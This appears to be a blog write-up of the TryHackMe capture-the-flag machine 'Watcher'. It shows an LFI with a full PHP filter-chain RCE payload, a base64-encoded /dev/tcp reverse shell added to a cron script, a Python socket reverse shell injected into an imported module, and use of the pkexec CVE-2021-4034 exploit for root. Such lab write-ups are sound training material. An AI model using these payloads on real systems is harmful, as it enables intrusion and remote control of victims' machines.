---
title: "Watcher"
date: 2025-03-25
image: /assets/img/tryhackme/Watcher/Watcher_image.jpg
description: Writeup of the TryHackMe-CTF Watcher
categories: [TryHackMe, Medium]
tags: [linux, lfi, phpchainrce, rce, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Watcher</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/watcher">https://tryhackme.com/room/watcher</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Watcher.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.115.29
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-25 14:18 EDT
  Nmap scan report for 10.10.115.29
  Host is up (0.050s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  21/tcp open  ftp
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,22,80 10.10.115.29
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-25 14:19 EDT
  Nmap scan report for 10.10.115.29
  Host is up (0.062s latency).

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
  |   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
  |_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Corkplacemats
  |_http-generator: Jekyll v4.1.1
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I began by examining the webserver, which displayed a website for cork placemats. While enumerating the pages manually the URL - specifically the `post` variable - caught my attention:
```bash
http://10.10.115.29/post.php?post=round.php
```

Since the parameter referenced a PHP file, I successfully accessed `/etc/passwd` :

![LFI](/assets/img/tryhackme/Watcher/thm_watcher_1.jpg)

Great! Discovering a Local File Injection (LFI) vulnerability, I attempted to read interesting files like SSH keys but was unsuccessful. I proceeded to attempt Remote Code Execution (RCE) using a PHP filter chain. For this, I used the Python script from this <a href="https://github.com/synacktiv/php_filter_chain_generator">GitHub</a> and successfully executed the `id` command:

```bash
kali@kali:~/ctf/watcher$ python3 gen.py --chain '<?=`$_GET[0]`?>'                                                                                               
[+] The following gadget chain will generate the following code : <?=`$_GET[0]`?> (base64 value: PD89YCRfR0VUWzBdYD8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.
base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.
UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.
SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.
base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.
UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.
base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.
CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.
iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.
iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.
iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.
iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.
base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.
iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.
SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.
base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![RCE](/assets/img/tryhackme/Watcher/thm_watcher_2.jpg)

## Shell as www-data

To exploit this and gain initial access, I used the PHP shell to obtain a reverse shell and captured it using Netcat. I then switched to Penelope for a more comfortable shell environment. From there, I retrieved the first flag:
```bash
www-data@watcher:/var/www/html$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@watcher:/var/www/html$ cat flag_1.txt 
  FLAG{r[removed]t}
```

Since the first flag's filename contained a number, I assumed I could find more flags by using the `find` command:
```bash
www-data@watcher:/$ find / -type f -name "flag_*" 2>/dev/null
  /home/mat/flag_5.txt
  /home/ftpuser/ftp/flag_2.txt
  /home/will/flag_6.txt
  /home/toby/flag_4.txt
  /var/www/html/more_secrets_a9f10a/flag_3.txt
  /var/www/html/flag_1.txt
```

Since I had an idea of where the flags were, I continued enumerating the directories. I found an interesting note containing ftp credentials and successfully received the second flag:
```bash
www-data@watcher:/var/www/html$ cat secret_file_do_not_read.txt 
  Hi Mat,

  The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

  Will

  ----------

  ftpuser:g[removed]7

kali@kali:~/ctf/watcher$ ftp ftpuser@10.10.115.29
  Connected to 10.10.115.29.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password: 
  230 Login successful.
  
  ftp> ls
  drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
  -rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt

kali@kali:~/ctf/watcher$ cat flag_2.txt                             
  FLAG{f[removed]e}

www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt 
  FLAG{lfi_what_a_guy}
```

After retrieving the last flag that www-data had access to, I began escalating my privileges: 

## Privilege Escalation toby

I continued by executing `sudo -l`, which returned the following output:
```bash
www-data@watcher:/$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

The user www-data had all permissions for the user toby when using sudo. I used this to retrieve the next flag and to switch to user toby:
```bash
www-data@watcher:/$ sudo -u toby cat /home/toby/flag_4.txt 
  FLAG{c[removed]e} 

www-data@watcher:/$ sudo -u toby bash
toby@watcher:/$ id
  uid=1003(toby) gid=1003(toby) groups=1003(toby)
```

While enumerating Toby's home directory, I found an interesting note from Mat:
```bash
toby@watcher:~$ cat note.txt 
  Hi Toby,

  I've got the cron jobs set up now so don't worry about getting that done.

  Mat
```

## Privilege Escalation mat

Because of the note, I continued with the cron entries and received the following output:
```bash
toby@watcher:~/jobs$ cat /etc/crontab 
  [...]
  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  */1 * * * * mat /home/toby/jobs/cow.sh
```

The last entry, which was executed every minute, caught my attention. I analyzed the script itself and check who had permissions to modify it:
```bash
toby@watcher:~/jobs$ cat cow.sh 
  #!/bin/bash
  cp /home/mat/cow.jpg /tmp/cow.jpg
toby@watcher:~/jobs$ ls -al cow.sh 
  -rwxr-xr-x 1 toby toby 46 Dec  3  2020 cow.sh
```

Since I had the permission to modify the script, and it got executed by Mat afterwards, I added a Penelope reverse shell payload. After a few seconds, I received the reverse shell and successfully retrieved the next flag:
```bash
toby@watcher:~/jobs$ cat cow.sh 
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg

echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvW2F0dGFja2VyaXBdLzkwMDIgMD4mMSAmCg==|base64 -d|bash

mat@watcher:~$ id
uid=1002(mat) gid=1002(mat) groups=1002(mat)

mat@watcher:~$ cat flag_5.txt 
  FLAG{l[removed]w}
```

## Privilege Escalation will

While enumerating Mat's permissions, I found a note from Will:
```bash
mat@watcher:~$ cat note.txt 
  Hi Mat,

  I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

  Will
```

After executing `sudo -l`, I understood what Will referenced to with his note:
```bash
mat@watcher:~$ sudo -l
  Matching Defaults entries for mat on watcher:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User mat may run the following commands on watcher:
      (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

I analyzed the Python script to see how it could be used to escalate my privileges:
```bash
mat@watcher:~/scripts$ cat will_script.py 
  import os
  import sys
  from cmd import get_command

  cmd = get_command(sys.argv[1])

  whitelist = ["ls -lah", "id", "cat /etc/passwd"]

  if cmd not in whitelist:
          print("Invalid command!")
          exit()

  os.system(cmd)
```

The script simply checks whether the command is part of the array whitelist. The `get_command` function, imported from the `cmd.py` file, returns a command based on a number provided as an input parameter to `will_script.py`:  
```bash
mat@watcher:~/scripts$ cat cmd.py 
  def get_command(num):
          if(num == "1"):
                  return "ls -lah"
          if(num == "2"):
                  return "id"
          if(num == "3"):
                  return "cat /etc/passwd"
```

I checked the permissions if I could modify one of the files and found that I indeed had the ability to modify `cmd.py`:
```bash
mat@watcher:~/scripts$ ls -al
  total 16
  drwxrwxr-x 2 will will 4096 Dec  3  2020 .
  drwxr-xr-x 6 mat  mat  4096 Dec  3  2020 ..
  -rw-r--r-- 1 mat  mat   133 Dec  3  2020 cmd.py
  -rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py
```

To exploit this, I added a Python reverse shell to `cmd.py`:
```bash
mat@watcher:~/scripts$ cat cmd.py 
import sys,socket,os,pty;

def get_command(num):  
        s=socket.socket();s.connect(("[removed]",int(4444)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")

        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

After executing the Python script as Will, I was able to retrieve the next flag:
```bash
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py "id"

will@watcher:~/scripts$ id
  uid=1000(will) gid=1000(will) groups=1000(will),4(adm)

will@watcher:/home/will$ cat flag_6.txt 
FLAG{b[removed]e}
```

## Privilege Escalation root

Next, I checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
will@watcher:/home/will$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
will@watcher:/home/will$ nano exploit.py
will@watcher:/home/will$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f3cf7e68000 at 0x7f3cf5a6e828>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1000(will) groups=1000(will),4(adm)
# cat/root/flag_7.txt
  FLAG{w[removed]s}
```

solved! :)